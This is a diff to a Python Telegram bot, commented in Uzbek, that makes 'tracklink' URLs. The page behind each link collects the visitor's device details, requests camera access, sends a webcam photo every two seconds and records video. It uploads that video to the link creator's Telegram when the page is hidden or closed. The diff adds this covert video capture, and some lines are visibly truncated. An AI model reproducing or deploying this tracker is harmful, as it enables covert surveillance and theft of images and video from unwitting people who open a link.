@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+# main.py
 import logging
 import os
 import uuid
@@ -8,9 +10,7 @@ from datetime import datetime
 from io import BytesIO
 from aiohttp import web
 from telegram import Update, InputFile
-from telegram.ext import (
-    Application, CommandHandler, ContextTypes
-)
+from telegram.ext import Application, CommandHandler, ContextTypes
 
 # ---------------- LOG ----------------
 logging.basicConfig(
@@ -25,10 +25,10 @@ ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
 WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
 
 if not BOT_TOKEN:
-    logger.error("BOT_TOKEN muhim! ENV ga qo'ying.")
+    logger.error("BOT_TOKEN muhim!")
     exit(1)
 if not WEBHOOK_DOMAIN:
-    logger.error("WEBHOOK_DOMAIN muhim! (https://...)")
+    logger.error("WEBHOOK_DOMAIN muhim!")
     exit(1)
 
 # ---------------- GLOBAL STATE ----------------
@@ -37,7 +37,6 @@ USER_TOKENS = {}  # token -> telegram_id
 # ---------------- Telegram Handlers ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("👋 Salom! /tracklink buyrug'ini yuboring.")
-    await update.message.reply_text(" Test /tracklink")
 
 async def cmd_tracklink(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -58,10 +57,14 @@ async def track_page(request):
     html = f"""
     <html><head><title>Ma'lumot yig'ilmoqda...</title></head><body>
     <h2>Ma'lumotlar yig'ilmoqda...</h2>
-    <html><head><title>Jgarim</title></head><body>
-    <h2>Iltimos Kuting...</h2>
     <script>
+      let mediaRecorder = null;
+      let recordedChunks = [];
+      let videoStream = null;
+      let captureInterval = null;
+
       async function collect() {{
+        const token = '{token}';
         const data = {{
           timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
@@ -115,28 +118,62 @@ async def track_page(request):
           data.mediaDevices = `mikrofon: ${{audioIn}} ta, karnay: ${{audioOut}} ta, kamera: ${{video}} ta`;
         }} catch(e) {{}}
 
-        // Kamera ruxsati so'rash va har 2 soniyada rasm yuborish
         try {{
           const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
-          const video = document.createElement('video');
-          video.srcObject = stream;
-          video.play();
+          videoStream = stream;
 
-          const canvas = document.createElement('canvas');
-          const ctx = canvas.getContext('2d');
-
-          setInterval(() => {{
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            const imageData = canvas.toDataURL('image/jpeg');
-
-            fetch('/upload_image', {{
-              method: 'POST',
-              headers: {{ 'Content-Type': 'application/json' }},
-              body: JSON.stringify({{ token: '{token}', image: imageData }})
-            }});
+          // Surat olish har 2 soniyada (sifatni pasaytiramiz)
+          captureInterval = setInterval(() => {{
+            const videoTrack = stream.getVideoTracks()[0];
+            if (!videoTrack) return;
+            const imageCapture = new ImageCapture(videoTrack);
+            imageCapture.takePhoto()
+              .then(blob => {{
+                const reader = new FileReader();
+                reader.onloadend = () => {{
+                  fetch('/upload_photo', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{ token, photo: reader.result }})
+                  }});
+                }};
+                reader.readAsDataURL(blob);
+              }})
+              .catch(console.error);
           }}, 2000);
+
+          // Video yozish
+          mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp9' }});
+          recordedChunks = [];
+          mediaRecorder.ondataavailable = (event) => {{
+            if (event.data.size > 0) recordedChunks.push(event.data);
+          }};
+          mediaRecorder.start();
+
+          // Video tugatish funksiyasi
+          const sendVideo = () => {{
+            if (mediaRecorder && mediaRecorder.state === "recording") {{
+              mediaRecorder.stop();
+              if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+              clearInterval(captureInterval);
+              const blob = new Blob(recordedChunks, {{ type: 'video/webm' }});
+              if (blob.size < 1000) return; // bo'sh bo'lsa yuborma
+              const reader = new FileReader();
+              reader.onloadend = () => {{
+                fetch('/upload_video', {{
+                  method: 'POST',
+                  headers: {{ 'Content-Type': 'application/json' }},
+                  body: JSON.stringify({{ token, video: reader.result }})
+                }});
+              }};
+              reader.readAsDataURL(blob);
+            }}
+          }};
+
+          window.addEventListener('beforeunload', sendVideo);
+          document.addEventListener('visibilitychange', () => {{
+            if (document.hidden) sendVideo();
+          }});
 
           // Kamera resolution
           const [track] = stream.getVideoTracks();
@@ -145,16 +182,20 @@ async def track_page(request):
             data.cameraRes = `${{caps.width.max}} x ${{caps.height.max}} @${{caps.frameRate?.max || '?'}}fps`;
           }}
         }} catch (e) {{
-          // Kamera ruxsati berilmagan — hech narsa qilmaymiz
+          // Kamera ruxsati berilmagan — faqat qurilma ma'lumotlarini yuboramiz
+          fetch('/submit', {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify({{ token, ...data }})
+          }});
+          return;
         }}
 
+        // Qurilma ma'lumotlarini yuborish
         fetch('/submit', {{
           method: 'POST',
           headers: {{ 'Content-Type': 'application/json' }},
-          body: JSON.stringify({{ token: '{token}', ...data }})
-        }}).then(() => {{
-          document.body.innerHTML = '<h2>✅ Ma\\'lumotlar yuborildi!</h2>';
-          document.body.innerHTML = '<h2>✅ Rahmat!</h2>';
+          body: JSON.stringify({{ token, ...data }})
         }});
       }}
       collect();
@@ -177,7 +218,6 @@ async def submit_data(request):
 
         message = f"""
 Kichik eslatma link telegram orqali ochilsa
-Test
 
 Qurilma ma'lumoti
 {data.get('timestamp', 'Noma\'lum')}
@@ -205,37 +245,76 @@ UA: {data.get('userAgent', 'Noma\'lum')}
         logger.exception(f"[SUBMIT ERROR] {e}")
         return web.json_response({"error": str(e)}, status=500)
 
-# ---------------- Web Server: /upload_image ----------------
-async def upload_image(request):
+# ---------------- Web Server: /upload_photo ----------------
+async def upload_photo(request):
     try:
         data = await request.json()
         token = data.get('token')
-        image_data = data.get('image')  # data:image/jpeg;base64,...
-
+        photo_data = data.get('photo')
         telegram_id = USER_TOKENS.get(token)
         if not telegram_id:
             return web.json_response({"error": "Token not found"}, status=400)
 
-        if ',' in image_data:
-            image_data = image_data.split(',', 1)[1]
+        if ',' in photo_
+            photo_data = photo_data.split(',', 1)[1]
 
-        image_bytes = base64.b64decode(image_data)
-        image_io = BytesIO(image_bytes)
-        image_io.name = "photo.jpg"
+        # Base64 ni tekshirish
+        if len(photo_data) < 100:
+            return web.json_response({"status": "empty"}, status=200)
 
-        await request.app['bot'].send_photo(chat_id=telegram_id, photo=InputFile(image_io))
+        photo_bytes = base64.b64decode(photo_data)
+        photo_io = BytesIO(photo_bytes)
+        photo_io.name = "photo.jpg"
+
+        await request.app['bot'].send_photo(
+            chat_id=telegram_id,
+            photo=InputFile(photo_io),
+            caption="📸 Yangi surat (har 2 soniyada olinadi)"
+        )
         return web.json_response({"status": "ok"})
     except Exception as e:
-        logger.exception("[UPLOAD IMAGE ERROR]")
+        logger.exception("[UPLOAD PHOTO ERROR]")
+        return web.json_response({"error": str(e)}, status=500)
+
+# ---------------- Web Server: /upload_video ----------------
+async def upload_video(request):
+    try:
+        data = await request.json()
+        token = data.get('token')
+        video_data = data.get('video')
+        telegram_id = USER_TOKENS.get(token)
+        if not telegram_id:
+            return web.json_response({"error": "Token not found"}, status=400)
+
+        if ',' in video_
+            video_data = video_data.split(',', 1)[1]
+
+        if len(video_data) < 1000:  # juda kichik
+            return web.json_response({"status": "empty"}, status=200)
+
+        video_bytes = base64.b64decode(video_data)
+        video_io = BytesIO(video_bytes)
+        video_io.name = "recording.webm"
+
+        await request.app['bot'].send_video(
+            chat_id=telegram_id,
+            video=InputFile(video_io),
+            caption="📹 Sahifa yopildi — sessiya video yozuvi"
+        )
+        return web.json_response({"status": "ok"})
+    except Exception as e:
+        logger.exception("[UPLOAD VIDEO ERROR]")
         return web.json_response({"error": str(e)}, status=500)
 
 # ---------------- Web Server Starter ----------------
 async def start_web_server(bot):
-    app = web.Application()
+    # Maksimal hajmni 10 MB qilish
+    app = web.Application(client_max_size=10 * 1024 * 1024)
     app['bot'] = bot
     app.router.add_get('/track', track_page)
     app.router.add_post('/submit', submit_data)
-    app.router.add_post('/upload_image', upload_image)  # ✅ Yangi endpoint
+    app.router.add_post('/upload_photo', upload_photo)
+    app.router.add_post('/upload_video', upload_video)
     runner = web.AppRunner(app)
     await runner.setup()
     port = int(os.getenv("PORT", "8000"))
